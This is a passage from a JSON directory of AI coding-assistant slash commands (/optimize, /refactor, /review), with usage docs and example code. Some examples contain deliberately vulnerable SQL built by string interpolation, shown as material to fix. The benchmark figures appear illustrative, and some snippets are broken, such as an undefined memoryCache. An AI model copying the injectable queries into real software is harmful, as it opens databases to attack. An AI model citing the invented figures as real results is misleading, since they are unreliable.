      "content": "The `/optimize` command provides comprehensive performance analysis and optimization recommendations including bottleneck identification, memory profiling, algorithm improvements, and automated code transformations.\n\n## Usage\n\n```\n/optimize [options] <file_or_function>\n```\n\n## Options\n\n### Optimization Types\n- `--performance` - CPU and execution time optimization\n- `--memory` - Memory usage and allocation optimization\n- `--network` - Network request and bandwidth optimization\n- `--database` - Database query and connection optimization\n- `--bundle` - Bundle size and loading optimization\n- `--all` - Comprehensive optimization analysis (default)\n\n### Analysis Depth\n- `--quick` - Fast analysis with basic recommendations\n- `--detailed` - Comprehensive profiling and analysis\n- `--deep` - Advanced algorithm and architecture analysis\n- `--benchmark` - Performance benchmarking and comparison\n\n### Target Metrics\n- `--latency` - Focus on response time reduction\n- `--throughput` - Focus on request handling capacity\n- `--scalability` - Focus on scaling characteristics\n- `--efficiency` - Focus on resource utilization\n\n### Output Options\n- `--format=report` - Detailed optimization report (default)\n- `--format=diff` - Before/after code comparison\n- `--format=metrics` - Performance metrics and benchmarks\n- `--format=interactive` - Interactive optimization guide\n\n## Examples\n\n### Database Query Optimization\n\n```javascript\n// Unoptimized code with multiple performance issues\nclass ProductService {\n  constructor(database) {\n    this.db = database;\n  }\n  \n  // üêå Issue 1: N+1 Query Problem\n  async getProductsWithReviews() {\n    const products = await this.db.query('SELECT * FROM products');\n    \n    for (const product of products) {\n      // üêå Executes N queries (one per product)\n      product.reviews = await this.db.query(\n        'SELECT * FROM reviews WHERE product_id = ?', \n        [product.id]\n      );\n      \n      // üêå Issue 2: Another N queries for user data\n      for (const review of product.reviews) {\n        review.user = await this.db.query(\n          'SELECT name, avatar FROM users WHERE id = ?',\n          [review.user_id]\n        );\n      }\n    }\n    \n    return products;\n  }\n  \n  // üêå Issue 3: Inefficient search without indexes\n  async searchProducts(searchTerm) {\n    return await this.db.query(`\n      SELECT * FROM products \n      WHERE LOWER(name) LIKE LOWER('%${searchTerm}%') \n         OR LOWER(description) LIKE LOWER('%${searchTerm}%')\n      ORDER BY name\n    `);\n  }\n  \n  // üêå Issue 4: No pagination, loads all data\n  async getPopularProducts() {\n    return await this.db.query(`\n      SELECT p.*, COUNT(r.id) as review_count,\n             AVG(r.rating) as avg_rating\n      FROM products p\n      LEFT JOIN reviews r ON p.id = r.product_id\n      GROUP BY p.id\n      ORDER BY review_count DESC, avg_rating DESC\n    `);\n  }\n  \n  // üêå Issue 5: Expensive aggregation on every call\n  async getProductStats(productId) {\n    const product = await this.db.query(\n      'SELECT * FROM products WHERE id = ?', \n      [productId]\n    );\n    \n    const reviewCount = await this.db.query(\n      'SELECT COUNT(*) as count FROM reviews WHERE product_id = ?',\n      [productId]\n    );\n    \n    const avgRating = await this.db.query(\n      'SELECT AVG(rating) as avg FROM reviews WHERE product_id = ?',\n      [productId]\n    );\n    \n    const recentReviews = await this.db.query(\n      'SELECT * FROM reviews WHERE product_id = ? ORDER BY created_at DESC LIMIT 5',\n      [productId]\n    );\n    \n    return {\n      ...product[0],\n      reviewCount: reviewCount[0].count,\n      avgRating: avgRating[0].avg,\n      recentReviews\n    };\n  }\n}\n```\n\n**Optimization Analysis:**\n\n```markdown\n# üöÄ Performance Optimization Report\n\n## üìä Performance Issues Identified\n\n### Issue 1: N+1 Query Problem (Critical)\n**Location:** `getProductsWithReviews()` method\n**Impact:** üî¥ Severe - O(n¬≤) database queries\n**Current Performance:** 1,000 products = 2,001 queries\n**Estimated Fix Impact:** 99.5% query reduction\n\n**Problem Analysis:**\n```\nCurrent Execution:\n1. SELECT * FROM products (1 query)\n2. For each product (N queries):\n   - SELECT * FROM reviews WHERE product_id = ?\n3. For each review (N*M queries):\n   - SELECT name, avatar FROM users WHERE id = ?\n\nTotal Queries: 1 + N + (N * avg_reviews_per_product)\nWith 100 products, 5 reviews each: 1 + 100 + 500 = 601 queries!\n```\n\n**Optimized Solution:**\n```javascript\nasync getProductsWithReviews() {\n  // ‚úÖ Single optimized query with JOINs\n  const query = `\n    SELECT \n      p.id as product_id,\n      p.name as product_name,\n      p.description,\n      p.price,\n      p.created_at as product_created_at,\n      r.id as review_id,\n      r.rating,\n      r.comment,\n      r.created_at as review_created_at,\n      u.name as user_name,\n      u.avatar as user_avatar\n    FROM products p\n    LEFT JOIN reviews r ON p.id = r.product_id\n    LEFT JOIN users u ON r.user_id = u.id\n    ORDER BY p.id, r.created_at DESC\n  `;\n  \n  const rows = await this.db.query(query);\n  \n  // ‚úÖ Transform flat result into nested structure\n  const productsMap = new Map();\n  \n  for (const row of rows) {\n    if (!productsMap.has(row.product_id)) {\n      productsMap.set(row.product_id, {\n        id: row.product_id,\n        name: row.product_name,\n        description: row.description,\n        price: row.price,\n        created_at: row.product_created_at,\n        reviews: []\n      });\n    }\n    \n    const product = productsMap.get(row.product_id);\n    \n    if (row.review_id) {\n      product.reviews.push({\n        id: row.review_id,\n        rating: row.rating,\n        comment: row.comment,\n        created_at: row.review_created_at,\n        user: {\n          name: row.user_name,\n          avatar: row.user_avatar\n        }\n      });\n    }\n  }\n  \n  return Array.from(productsMap.values());\n}\n\n// ‚úÖ Performance improvement: 601 queries ‚Üí 1 query (99.8% reduction)\n```\n\n### Issue 2: Missing Database Indexes (High)\n**Location:** `searchProducts()` method\n**Impact:** üü° High - Full table scans on every search\n**Current Performance:** O(n) scan of entire products table\n**Estimated Fix Impact:** 10-100x search speed improvement\n\n**Index Recommendations:**\n```sql\n-- ‚úÖ Full-text search index for product names and descriptions\nCREATE FULLTEXT INDEX idx_products_search \nON products(name, description);\n\n-- ‚úÖ Composite index for filtered searches\nCREATE INDEX idx_products_category_price \nON products(category_id, price);\n\n-- ‚úÖ Index for popular products query\nCREATE INDEX idx_reviews_product_rating \nON reviews(product_id, rating);\n```\n\n**Optimized Search Query:**\n```javascript\nasync searchProducts(searchTerm, filters = {}) {\n  let query = `\n    SELECT p.*, \n           MATCH(p.name, p.description) AGAINST(? IN NATURAL LANGUAGE MODE) as relevance\n    FROM products p\n    WHERE MATCH(p.name, p.description) AGAINST(? IN NATURAL LANGUAGE MODE)\n  `;\n  \n  const params = [searchTerm, searchTerm];\n  \n  // ‚úÖ Add filters with indexed columns\n  if (filters.category_id) {\n    query += ' AND p.category_id = ?';\n    params.push(filters.category_id);\n  }\n  \n  if (filters.min_price) {\n    query += ' AND p.price >= ?';\n    params.push(filters.min_price);\n  }\n  \n  if (filters.max_price) {\n    query += ' AND p.price <= ?';\n    params.push(filters.max_price);\n  }\n  \n  query += ' ORDER BY relevance DESC, p.name LIMIT ? OFFSET ?';\n  params.push(filters.limit || 20, filters.offset || 0);\n  \n  return await this.db.query(query, params);\n}\n```\n\n### Issue 3: Missing Pagination (Medium)\n**Location:** `getPopularProducts()` method\n**Impact:** üü° Medium - Memory and bandwidth waste\n**Current Performance:** Loads entire dataset regardless of need\n**Estimated Fix Impact:** 80% memory reduction, faster response times\n\n**Optimized with Pagination:**\n```javascript\nasync getPopularProducts(page = 1, pageSize = 20) {\n  const offset = (page - 1) * pageSize;\n  \n  // ‚úÖ Paginated query with LIMIT/OFFSET\n  const [products, totalCount] = await Promise.all([\n    this.db.query(`\n      SELECT p.id, p.name, p.price, p.image_url,\n             COUNT(r.id) as review_count,\n             ROUND(AVG(r.rating), 2) as avg_rating\n      FROM products p\n      LEFT JOIN reviews r ON p.id = r.product_id\n      GROUP BY p.id\n      HAVING review_count > 0\n      ORDER BY review_count DESC, avg_rating DESC\n      LIMIT ? OFFSET ?\n    `, [pageSize, offset]),\n    \n    // ‚úÖ Get total count for pagination metadata\n    this.db.query(`\n      SELECT COUNT(DISTINCT p.id) as total\n      FROM products p\n      INNER JOIN reviews r ON p.id = r.product_id\n    `)\n  ]);\n  \n  return {\n    products,\n    pagination: {\n      page,\n      pageSize,\n      total: totalCount[0].total,\n      totalPages: Math.ceil(totalCount[0].total / pageSize)\n    }\n  };\n}\n```\n\n### Issue 4: Redundant Aggregation Queries (Medium)\n**Location:** `getProductStats()` method\n**Impact:** üü° Medium - Multiple unnecessary database roundtrips\n**Current Performance:** 4 separate queries per call\n**Estimated Fix Impact:** 75% query reduction\n\n**Optimized Single Query:**\n```javascript\nasync getProductStats(productId) {\n  // ‚úÖ Single query with all required data\n  const result = await this.db.query(`\n    SELECT \n      p.*,\n      COUNT(r.id) as review_count,\n      ROUND(AVG(r.rating), 2) as avg_rating,\n      JSON_ARRAYAGG(\n        CASE \n          WHEN r.id IS NOT NULL \n          THEN JSON_OBJECT(\n            'id', r.id,\n            'rating', r.rating,\n            'comment', r.comment,\n            'created_at', r.created_at,\n            'user_name', u.name\n          )\n          ELSE NULL\n        END\n      ) as recent_reviews\n    FROM products p\n    LEFT JOIN (\n      SELECT * FROM reviews \n      WHERE product_id = ? \n      ORDER BY created_at DESC \n      LIMIT 5\n    ) r ON p.id = r.product_id\n    LEFT JOIN users u ON r.user_id = u.id\n    WHERE p.id = ?\n    GROUP BY p.id\n  `, [productId, productId]);\n  \n  const product = result[0];\n  \n  // ‚úÖ Parse JSON array of recent reviews\n  product.recent_reviews = JSON.parse(product.recent_reviews)\n    .filter(review => review !== null);\n  \n  return product;\n}\n\n// ‚úÖ Performance improvement: 4 queries ‚Üí 1 query (75% reduction)\n```\n\n## üß† Caching Strategy Implementation\n\n```javascript\nconst Redis = require('redis');\n\nclass OptimizedProductService {\n  constructor(database, cache) {\n    this.db = database;\n    this.cache = cache || Redis.createClient();\n  }\n  \n  // ‚úÖ Multi-level caching strategy\n  async getProductStats(productId) {\n    const cacheKey = `product:stats:${productId}`;\n    \n    // Level 1: Memory cache check\n    let stats = this.memoryCache.get(cacheKey);\n    if (stats) {\n      return stats;\n    }\n    \n    // Level 2: Redis cache check\n    const cached = await this.cache.get(cacheKey);\n    if (cached) {\n      stats = JSON.parse(cached);\n      this.memoryCache.set(cacheKey, stats, 300); // 5 min memory cache\n      return stats;\n    }\n    \n    // Level 3: Database query\n    stats = await this.fetchProductStatsFromDB(productId);\n    \n    // Cache the result\n    await this.cache.setex(cacheKey, 3600, JSON.stringify(stats)); // 1 hour Redis cache\n    this.memoryCache.set(cacheKey, stats, 300); // 5 min memory cache\n    \n    return stats;\n  }\n  \n  // ‚úÖ Cache invalidation on updates\n  async updateProduct(productId, updates) {\n    await this.db.query(\n      'UPDATE products SET ? WHERE id = ?',\n      [updates, productId]\n    );\n    \n    // Invalidate related caches\n    await this.cache.del(`product:stats:${productId}`);\n    await this.cache.del(`product:${productId}`);\n    this.memoryCache.delete(`product:stats:${productId}`);\n  }\n}\n```\n\n## üìä Performance Benchmarks\n\n### Before Optimization\n```\nOperation                    | Time    | Queries | Memory\n---------------------------- | ------- | ------- | -------\ngetProductsWithReviews(100)  | 2.3s    | 601     | 45MB\nsearchProducts(\"laptop\")     | 450ms   | 1       | 12MB\ngetPopularProducts()         | 890ms   | 1       | 67MB\ngetProductStats(123)         | 180ms   | 4       | 2MB\n```\n\n### After Optimization\n```\nOperation                    | Time    | Queries | Memory  | Improvement\n---------------------------- | ------- | ------- | ------- | -----------\ngetProductsWithReviews(100)  | 45ms    | 1       | 8MB     | 98% faster\nsearchProducts(\"laptop\")     | 12ms    | 1       | 1MB     | 97% faster\ngetPopularProducts(20)       | 35ms    | 2       | 2MB     | 96% faster\ngetProductStats(123)         | 8ms     | 1       | 0.5MB   | 95% faster\n```\n\n### Load Testing Results\n```\nConcurrent Users: 1000\nTest Duration: 5 minutes\n\nBefore Optimization:\n‚îú‚îÄ Average Response Time: 1.2s\n‚îú‚îÄ 95th Percentile: 3.5s\n‚îú‚îÄ Requests/sec: 120\n‚îú‚îÄ Error Rate: 15%\n‚îî‚îÄ CPU Usage: 85%\n\nAfter Optimization:\n‚îú‚îÄ Average Response Time: 85ms\n‚îú‚îÄ 95th Percentile: 150ms\n‚îú‚îÄ Requests/sec: 2,400\n‚îú‚îÄ Error Rate: 0.1%\n‚îî‚îÄ CPU Usage: 25%\n\nImprovement:\n‚îú‚îÄ 14x faster response time\n‚îú‚îÄ 20x higher throughput\n‚îú‚îÄ 150x fewer errors\n‚îî‚îÄ 70% less CPU usage\n```\n\n## üîß Algorithm Optimization Examples\n\n### Array Processing Optimization\n\n```javascript\n// üêå Inefficient: Multiple array iterations\nfunction processProducts(products) {\n  // O(n) - Filter active products\n  const activeProducts = products.filter(p => p.status === 'active');\n  \n  // O(n) - Add discounted prices\n  const withDiscounts = activeProducts.map(p => ({\n    ...p,\n    discountedPrice: p.price * 0.9\n  }));\n  \n  // O(n) - Sort by price\n  const sorted = withDiscounts.sort((a, b) => a.discountedPrice - b.discountedPrice);\n  \n  // O(n) - Take first 10\n  return sorted.slice(0, 10);\n}\n\n// ‚úÖ Optimized: Single iteration with early termination\nfunction processProductsOptimized(products) {\n  const result = [];\n  \n  // O(n) but with early termination\n  for (const product of products) {\n    if (product.status !== 'active') continue;\n    \n    const processedProduct = {\n      ...product,\n      discountedPrice: product.price * 0.9\n    };\n    \n    // Insert in sorted position (for small arrays, faster than full sort)\n    insertSorted(result, processedProduct, (a, b) => a.discountedPrice - b.discountedPrice);\n    \n    // Early termination once we have enough results\n    if (result.length > 10) {\n      result.pop(); // Remove the most expensive item\n    }\n  }\n  \n  return result;\n}\n\nfunction insertSorted(array, item, compareFn) {\n  if (array.length === 0) {\n    array.push(item);\n    return;\n  }\n  \n  // Binary search for insertion point\n  let left = 0;\n  let right = array.length;\n  \n  while (left < right) {\n    const mid = Math.floor((left + right) / 2);\n    if (compareFn(array[mid], item) <= 0) {\n      left = mid + 1;\n    } else {\n      right = mid;\n    }\n  }\n  \n  array.splice(left, 0, item);\n}\n\n// Performance improvement: 4x faster for large datasets\n```\n\n### Memory-Efficient Data Processing\n\n```javascript\n// üêå Memory inefficient: Creates multiple intermediate arrays\nfunction processLargeDataset(data) {\n  return data\n    .filter(item => item.isValid)           // Creates copy 1\n    .map(item => transformItem(item))       // Creates copy 2\n    .filter(item => item.score > 0.5)       // Creates copy 3\n    .sort((a, b) => b.score - a.score)      // Modifies copy 3\n    .slice(0, 100);                         // Creates copy 4\n}\n\n// ‚úÖ Memory efficient: Generator-based streaming\nfunction* processLargeDatasetStream(data) {\n  const results = [];\n  \n  for (const item of data) {\n    if (!item.isValid) continue;\n    \n    const transformed = transformItem(item);\n    if (transformed.score <= 0.5) continue;\n    \n    // Insert in sorted position\n    insertSorted(results, transformed, (a, b) => b.score - a.score);\n    \n    // Keep only top 100\n    if (results.length > 100) {\n      results.pop();\n    }\n  }\n  \n  yield* results;\n}\n\n// Usage: Memory usage reduced by 80%\nconst results = Array.from(processLargeDatasetStream(largeDataset));\n```\n\n## üåê Network Optimization\n\n### API Request Batching\n\n```javascript\n// üêå Individual API requests\nclass UserService {\n  async getUsersWithProfiles(userIds) {\n    const users = [];\n    \n    for (const id of userIds) {\n      const user = await fetch(`/api/users/${id}`);\n      const profile = await fetch(`/api/profiles/${id}`);\n      \n      users.push({\n        ...await user.json(),\n        profile: await profile.json()\n      });\n    }\n    \n    return users;\n  }\n}\n\n// ‚úÖ Batched requests with concurrency control\nclass OptimizedUserService {\n  async getUsersWithProfiles(userIds) {\n    // Batch API requests\n    const batchSize = 10;\n    const batches = this.chunk(userIds, batchSize);\n    \n    const allResults = [];\n    \n    for (const batch of batches) {\n      // Parallel requests within batch\n      const [users, profiles] = await Promise.all([\n        this.batchFetchUsers(batch),\n        this.batchFetchProfiles(batch)\n      ]);\n      \n      // Combine results\n      const combined = users.map(user => ({\n        ...user,\n        profile: profiles.find(p => p.userId === user.id)\n      }));\n      \n      allResults.push(...combined);\n    }\n    \n    return allResults;\n  }\n  \n  async batchFetchUsers(ids) {\n    const response = await fetch('/api/users/batch', {\n      method: 'POST',\n      headers: { 'Content-Type': 'application/json' },\n      body: JSON.stringify({ ids })\n    });\n    \n    return response.json();\n  }\n  \n  chunk(array, size) {\n    const chunks = [];\n    for (let i = 0; i < array.length; i += size) {\n      chunks.push(array.slice(i, i + size));\n    }\n    return chunks;\n  }\n}\n\n// Performance improvement: 10x faster for 100 users\n```\n\n### Request Deduplication\n\n```javascript\n// ‚úÖ Request deduplication to prevent duplicate API calls\nclass RequestCache {\n  constructor() {\n    this.cache = new Map();\n    this.pendingRequests = new Map();\n  }\n  \n  async get(url, options = {}) {\n    const key = this.generateKey(url, options);\n    \n    // Return cached result\n    if (this.cache.has(key)) {\n      return this.cache.get(key);\n    }\n    \n    // Join existing request if in progress\n    if (this.pendingRequests.has(key)) {\n      return this.pendingRequests.get(key);\n    }\n    \n    // Create new request\n    const request = this.fetchWithRetry(url, options)\n      .then(result => {\n        this.cache.set(key, result);\n        this.pendingRequests.delete(key);\n        \n        // Auto-expire cache\n        setTimeout(() => this.cache.delete(key), options.ttl || 300000);\n        \n        return result;\n      })\n      .catch(error => {\n        this.pendingRequests.delete(key);\n        throw error;\n      });\n    \n    this.pendingRequests.set(key, request);\n    return request;\n  }\n  \n  generateKey(url, options) {\n    return `${url}:${JSON.stringify(options.params || {})}`;\n  }\n  \n  async fetchWithRetry(url, options, retries = 3) {\n    for (let i = 0; i <= retries; i++) {\n      try {\n        const response = await fetch(url, options);\n        if (!response.ok) throw new Error(`HTTP ${response.status}`);\n        return await response.json();\n      } catch (error) {\n        if (i === retries) throw error;\n        await this.delay(Math.pow(2, i) * 1000); // Exponential backoff\n      }\n    }\n  }\n  \n  delay(ms) {\n    return new Promise(resolve => setTimeout(resolve, ms));\n  }\n}\n\nconst apiCache = new RequestCache();\n\n// Usage: Automatic deduplication and caching\nconst users = await apiCache.get('/api/users/123');\n```\n\n## üì± Bundle Size Optimization\n\n### Code Splitting and Lazy Loading\n\n```javascript\n// üêå Large bundle: Everything loaded upfront\nimport React from 'react';\nimport { BrowserRouter, Routes, Route } from 'react-router-dom';\nimport HomePage from './pages/HomePage';\nimport ProductsPage from './pages/ProductsPage';\nimport UserProfilePage from './pages/UserProfilePage';\nimport AdminDashboard from './pages/AdminDashboard';\nimport ReportsPage from './pages/ReportsPage';\n\nfunction App() {\n  return (\n    <BrowserRouter>\n      <Routes>\n        <Route path=\"/\" element={<HomePage />} />\n        <Route path=\"/products\" element={<ProductsPage />} />\n        <Route path=\"/profile\" element={<UserProfilePage />} />\n        <Route path=\"/admin\" element={<AdminDashboard />} />\n        <Route path=\"/reports\" element={<ReportsPage />} />\n      </Routes>\n    </BrowserRouter>\n  );\n}\n\n// ‚úÖ Optimized: Lazy loading with code splitting\nimport React, { Suspense } from 'react';\nimport { BrowserRouter, Routes, Route } from 'react-router-dom';\n\n// Critical components loaded immediately\nimport HomePage from './pages/HomePage';\n\n// Non-critical components lazy loaded\nconst ProductsPage = React.lazy(() => import('./pages/ProductsPage'));\nconst UserProfilePage = React.lazy(() => import('./pages/UserProfilePage'));\nconst AdminDashboard = React.lazy(() => import('./pages/AdminDashboard'));\nconst ReportsPage = React.lazy(() => import('./pages/ReportsPage'));\n\nfunction App() {\n  return (\n    <BrowserRouter>\n      <Suspense fallback={<div className=\"loading\">Loading...</div>}>\n        <Routes>\n          <Route path=\"/\" element={<HomePage />} />\n          <Route path=\"/products\" element={<ProductsPage />} />\n          <Route path=\"/profile\" element={<UserProfilePage />} />\n          <Route path=\"/admin\" element={<AdminDashboard />} />\n          <Route path=\"/reports\" element={<ReportsPage />} />\n        </Routes>\n      </Suspense>\n    </BrowserRouter>\n  );\n}\n\n// Bundle size reduction: 60% smaller initial bundle\n```\n\n### Tree Shaking Optimization\n\n```javascript\n// üêå Imports entire lodash library\nimport _ from 'lodash';\n\nconst users = _.uniqBy(userList, 'id');\nconst sorted = _.sortBy(products, 'name');\n\n// ‚úÖ Optimized: Import only needed functions\nimport uniqBy from 'lodash/uniqBy';\nimport sortBy from 'lodash/sortBy';\n\nconst users = uniqBy(userList, 'id');\nconst sorted = sortBy(products, 'name');\n\n// Even better: Use native methods where possible\nconst users = userList.filter((user, index, array) => \n  array.findIndex(u => u.id === user.id) === index\n);\nconst sorted = products.sort((a, b) => a.name.localeCompare(b.name));\n\n// Bundle size reduction: 95% smaller (from 70KB to 3KB)\n```\n\n## üéØ Optimization Checklist\n\n### ‚úÖ Database Optimization\n- [ ] Identify and fix N+1 query problems\n- [ ] Add appropriate indexes for frequent queries\n- [ ] Implement query result caching\n- [ ] Use pagination for large datasets\n- [ ] Optimize JOIN operations and subqueries\n- [ ] Monitor slow query logs\n\n### ‚úÖ Memory Optimization\n- [ ] Identify memory leaks with profiling tools\n- [ ] Implement object pooling for frequent allocations\n- [ ] Use streaming for large data processing\n- [ ] Optimize data structures and algorithms\n- [ ] Implement garbage collection tuning\n\n### ‚úÖ Network Optimization\n- [ ] Implement request batching and deduplication\n- [ ] Add compression (gzip/brotli)\n- [ ] Use CDN for static assets\n- [ ] Implement HTTP/2 server push\n- [ ] Optimize API response sizes\n- [ ] Add retry logic with exponential backoff\n\n### ‚úÖ Frontend Optimization\n- [ ] Implement code splitting and lazy loading\n- [ ] Optimize bundle sizes with tree shaking\n- [ ] Use service workers for caching\n- [ ] Implement virtual scrolling for large lists\n- [ ] Optimize images and assets\n- [ ] Minimize render cycles with memoization\n\nThis optimization guide demonstrates systematic performance improvement with measurable results and best practices across all layers of the application stack.",
      "configuration": {
        "temperature": 0.2,
        "maxTokens": 16000,
        "systemPrompt": "You are a performance optimization expert with deep knowledge of algorithms, databases, caching strategies, and system architecture. Provide specific, measurable optimizations with before/after comparisons."
      },
      "githubUrl": "https://github.com/claudepro/performance-optimizer",
      "documentationUrl": "https://docs.claude.ai/commands/optimize",
      "source": "community",
      "slug": "optimize",
      "type": "command",
      "url": "https://claudepro.directory/commands/optimize"
    },
    {
      "title": "/refactor",
      "description": "Intelligent code refactoring command that analyzes code structure and applies best practices for improved maintainability and performance",
      "category": "commands",
      "author": "JSONbored",
      "dateAdded": "2025-09-16",
      "tags": [
        "refactoring",
        "code-quality",
        "cleanup",
        "optimization",
        "patterns"
      ],
      "content": "The `/refactor` command provides intelligent code refactoring capabilities with multiple strategies and safety checks.\n\n## Usage\n\n```\n/refactor [options] <file_or_selection>\n```\n\n## Options\n\n### Refactoring Types\n- `--extract-function` - Extract repeated code into functions\n- `--extract-variable` - Extract complex expressions into variables\n- `--extract-constant` - Move magic numbers/strings to constants\n- `--inline` - Inline simple functions/variables\n- `--rename` - Rename variables/functions for clarity\n- `--simplify` - Simplify complex conditional logic\n- `--modernize` - Update to modern language features\n- `--performance` - Apply performance optimizations\n\n### Safety Options\n- `--dry-run` - Show proposed changes without applying\n- `--interactive` - Prompt for each change\n- `--backup` - Create backup before refactoring\n- `--test-first` - Run tests before and after changes\n\n### Language-Specific Options\n- `--javascript` - Apply JS/TS specific refactoring\n- `--python` - Apply Python-specific refactoring\n- `--java` - Apply Java-specific refactoring\n- `--csharp` - Apply C#-specific refactoring\n\n## Examples\n\n### Extract Function\n```javascript\n// Before\nfunction processUsers(users) {\n  for (let user of users) {\n    if (user.email && user.email.includes('@')) {\n      user.isValid = true;\n      user.domain = user.email.split('@')[1];\n    } else {\n      user.isValid = false;\n      user.domain = null;\n    }\n  }\n}\n\n// After refactoring with --extract-function\nfunction validateEmail(email) {\n  return email && email.includes('@');\n}\n\nfunction extractDomain(email) {\n  return email.split('@')[1];\n}\n\nfunction processUsers(users) {\n  for (let user of users) {\n    if (validateEmail(user.email)) {\n      user.isValid = true;\n      user.domain = extractDomain(user.email);\n    } else {\n      user.isValid = false;\n      user.domain = null;\n    }\n  }\n}\n```\n\n### Extract Constants\n```python\n# Before\ndef calculate_discount(price, customer_type):\n    if customer_type == \"premium\":\n        return price * 0.2\n    elif customer_type == \"regular\":\n        return price * 0.1\n    else:\n        return 0\n\n# After refactoring with --extract-constant\nPREMIUM_DISCOUNT_RATE = 0.2\nREGULAR_DISCOUNT_RATE = 0.1\nPREMIUM_CUSTOMER_TYPE = \"premium\"\nREGULAR_CUSTOMER_TYPE = \"regular\"\n\ndef calculate_discount(price, customer_type):\n    if customer_type == PREMIUM_CUSTOMER_TYPE:\n        return price * PREMIUM_DISCOUNT_RATE\n    elif customer_type == REGULAR_CUSTOMER_TYPE:\n        return price * REGULAR_DISCOUNT_RATE\n    else:\n        return 0\n```\n\n### Modernize Code\n```javascript\n// Before (ES5 style)\nfunction getUserNames(users) {\n  var names = [];\n  for (var i = 0; i < users.length; i++) {\n    if (users[i].active) {\n      names.push(users[i].name);\n    }\n  }\n  return names;\n}\n\n// After refactoring with --modernize\nfunction getUserNames(users) {\n  return users\n    .filter(user => user.active)\n    .map(user => user.name);\n}\n```\n\n## Refactoring Patterns\n\n### Design Patterns\n- **Strategy Pattern** - Replace conditional logic with strategy objects\n- **Factory Pattern** - Extract object creation logic\n- **Observer Pattern** - Implement event-driven architecture\n- **Decorator Pattern** - Add functionality without inheritance\n\n### Code Smells Detection\n- **Long Method** - Break down large functions\n- **Large Class** - Split into focused classes\n- **Duplicate Code** - Extract common functionality\n- **Long Parameter List** - Use parameter objects\n- **Feature Envy** - Move methods to appropriate classes\n\n### Performance Optimizations\n- **Lazy Loading** - Load resources only when needed\n- **Memoization** - Cache expensive computations\n- **Batch Operations** - Combine multiple operations\n- **Async Optimization** - Convert synchronous to asynchronous\n\n## Safety Measures\n\n### Pre-refactoring Checks\n- Syntax validation\n- Type checking (TypeScript, etc.)\n- Lint rule compliance\n- Test coverage analysis\n\n### Post-refactoring Validation\n- Automated test execution\n- Code quality metrics comparison\n- Performance benchmarking\n- Security vulnerability scanning\n\n## Integration\n\n### IDE Integration\n- VS Code extension support\n- IntelliJ plugin compatibility\n- Vim/Neovim integration\n- Emacs package support\n\n### CI/CD Integration\n- Pre-commit hooks\n- GitHub Actions workflow\n- GitLab CI pipeline\n- Jenkins job integration\n\n## Configuration\n\nCreate a `.refactor.json` file in your project root:\n\n```json\n{\n  \"rules\": {\n    \"maxFunctionLength\": 20,\n    \"maxParameterCount\": 4,\n    \"enforceConstantExtraction\": true,\n    \"modernizeFeatures\": true\n  },\n  \"exclude\": [\n    \"node_modules/**\",\n    \"dist/**\",\n    \"*.test.js\"\n  ],\n  \"backup\": {\n    \"enabled\": true,\n    \"directory\": \".refactor-backups\"\n  }\n}\n```",
      "configuration": {
        "temperature": 0.3,
        "maxTokens": 6000,
        "systemPrompt": "You are a code refactoring expert focused on improving code quality, maintainability, and performance while preserving functionality"
      },
      "githubUrl": "https://github.com/claudepro/refactor-command",
      "documentationUrl": "https://docs.claude.ai/commands/refactor",
      "source": "community",
      "slug": "refactor-code",
      "type": "command",
      "url": "https://claudepro.directory/commands/refactor-code"
    },
    {
      "title": "/review",
      "description": "Comprehensive code review with security analysis, performance optimization, and best practices validation",
      "category": "commands",
      "author": "claudepro",
      "dateAdded": "2025-09-16",
      "tags": [
        "code-review",
        "security",
        "performance",
        "quality",
        "analysis"
      ],
      "content": "The `/review` command provides comprehensive code analysis including security vulnerabilities, performance optimizations, code quality improvements, and adherence to best practices.\n\n## Usage\n\n```\n/review [options] <file_or_directory>\n```\n\n## Options\n\n### Review Types\n- `--security` - Focus on security vulnerabilities and threats\n- `--performance` - Analyze performance bottlenecks and optimizations\n- `--style` - Check coding style and formatting\n- `--architecture` - Review architectural patterns and design\n- `--all` - Comprehensive review (default)\n\n### Output Formats\n- `--format=markdown` - Markdown report (default)\n- `--format=json` - Machine-readable JSON output\n- `--format=html` - Rich HTML report\n- `--format=sarif` - SARIF format for CI/CD integration\n\n### Severity Filtering\n- `--severity=critical` - Only critical issues\n- `--severity=high` - High and critical issues\n- `--severity=medium` - Medium, high, and critical issues\n- `--severity=all` - All issues including low severity\n\n### Language-Specific Options\n- `--eslint` - Use ESLint rules for JavaScript/TypeScript\n- `--pylint` - Use Pylint for Python code\n- `--rustfmt` - Use Rust formatting and clippy\n- `--gofmt` - Use Go formatting and vet\n- `--rubocop` - Use RuboCop for Ruby\n\n## Examples\n\n### Basic Code Review\n\n```javascript\n// Example file: user-service.js\nclass UserService {\n  constructor() {\n    this.users = [];\n    this.database = new Database(process.env.DB_PASSWORD); // üö® Security Issue\n  }\n  \n  async createUser(userData) {\n    // üö® No input validation\n    const user = {\n      id: Math.random(), // üö® Poor ID generation\n      ...userData,\n      createdAt: new Date()\n    };\n    \n    // üö® SQL injection vulnerability\n    const query = `INSERT INTO users (name, email) VALUES ('${user.name}', '${user.email}')`;\n    await this.database.query(query);\n    \n    this.users.push(user);\n    return user;\n  }\n  \n  // üö® No access control\n  async deleteUser(userId) {\n    const index = this.users.findIndex(u => u.id == userId); // üö® Type coercion\n    if (index > -1) {\n      this.users.splice(index, 1);\n      return true;\n    }\n    return false;\n  }\n  \n  // üö® Inefficient search\n  async searchUsers(query) {\n    return this.users.filter(user => \n      user.name.toLowerCase().includes(query.toLowerCase()) ||\n      user.email.toLowerCase().includes(query.toLowerCase())\n    );\n  }\n}\n```\n\n**Generated Review Report:**\n\n```markdown\n# Code Review Report: user-service.js\n\n## üö® Critical Issues (4)\n\n### 1. SQL Injection Vulnerability\n**Location:** Line 15  \n**Severity:** Critical  \n**Category:** Security  \n\n**Issue:** Direct string concatenation in SQL query allows SQL injection attacks.\n\n```javascript\n// ‚ùå Vulnerable code\nconst query = `INSERT INTO users (name, email) VALUES ('${user.name}', '${user.email}')`;\n\n// ‚úÖ Recommended fix\nconst query = 'INSERT INTO users (name, email) VALUES (?, ?)';\nawait this.database.query(query, [user.name, user.email]);\n```\n\n**Impact:** Attackers could execute arbitrary SQL commands, potentially accessing or deleting sensitive data.\n\n### 2. Exposed Database Credentials\n**Location:** Line 4  \n**Severity:** Critical  \n**Category:** Security  \n\n**Issue:** Database password exposed in environment variable without proper encryption.\n\n```javascript\n// ‚ùå Vulnerable code\nthis.database = new Database(process.env.DB_PASSWORD);\n\n// ‚úÖ Recommended fix\nconst dbConfig = {\n  host: process.env.DB_HOST,\n  username: process.env.DB_USERNAME,\n  